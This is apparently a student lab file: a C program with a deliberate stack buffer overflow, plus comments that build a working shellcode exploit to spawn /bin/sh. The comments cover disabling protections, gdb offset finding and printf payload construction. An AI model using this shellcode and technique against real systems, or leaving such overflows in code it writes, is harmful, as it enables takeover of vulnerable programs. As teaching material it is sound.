#include <stdio.h>
#include <stdlib.h>

void lonely()
{
    puts("nobody ever calls me...\n");
}

int main()
{
    char buf[8];
    scanf("%s",buf);
    printf("you entered %s\n",buf);
    return 0;
}

// jumping to code written in stack
// plan is to put executable code into buffer and then make program execute

// compile
// gcc -g -fno-stack-protector -z execstack lab2.c -o lab2

// after putting code in shell.s, and run assembler on it

// objdump -d shell.o

/* 
shell.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:   5f                      pop    %rdi
   1:   48 31 c0                xor    %rax,%rax
   4:   b0 3b                   mov    $0x3b,%al
   6:   48 31 f6                xor    %rsi,%rsi
   9:   48 31 d2                xor    %rdx,%rdx
   c:   0f 05                   syscall

*/

// bytes on left (14 bytes of shell code) + 2 padding
// + return address (replace main address with buffer address so shell code is executed)
// + location of /bin/sh (arg for execve) + /bin/sh
// what we need to put in buffer

// we need /bin/sh because that's the arg for execve

// shell code starts with pop %rdi, so pops whatever is on top of stack and 
// puts it in %rdi

// %rdi MUST be /bin/sh

// similar process as last time

// put breakpoint at main to figure out it's return address
// print &buf to see it's address
// get the offset

// gdb ./lab2
// b main
// run

//info frame

// return address stored in rip : 0x7fffffffd848

// print &buf

// buf address : 0x7fffffffd838

// offset is again 16 bytes (0x10)

// attack string should be formatted like this:
// shell code + 2 bytes padding + buf address + /bin/sh address + /bin/sh string

// \x5f\x48\x31\xc0\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05 (14 bytes)
// aa (2 bytes)
// 0x7fffffffd838 -> \x38\xd8\xff\xff\xff\xff\x00\x00 (8 bytes)
// address of /bin/sh string -> buf address + 14(shell code) + 2(padding) + 8(return address) + 8(this address itself)
// buf addres + 32 -> 0x7fffffffd838 + 32 = 0x7fffffffd858
// /bin/sh string 

/*
(
  printf "\x5f\x48\x31\xc0\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05"
  
  printf "aa"
  
  printf "\x38\xd8\xff\xff\xff\x7f\x00\x00"
  
  printf "\x58\xd8\xff\xff\xff\x7f\x00\x00"
  
  printf "/bin/sh\x00"
) > exploit2.bin

*/

/*
alt approach?
(
  printf "\x5f\x48\x31\xc0\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05"
  
  printf "AA"
  
  printf "\x38\xd8\xff\xff\xff\x7f\x00\x00"
  
  printf "/bin/sh\x00"
) > exploit2.bin

*/

// setarch -R ./lab2 < exploit2.bin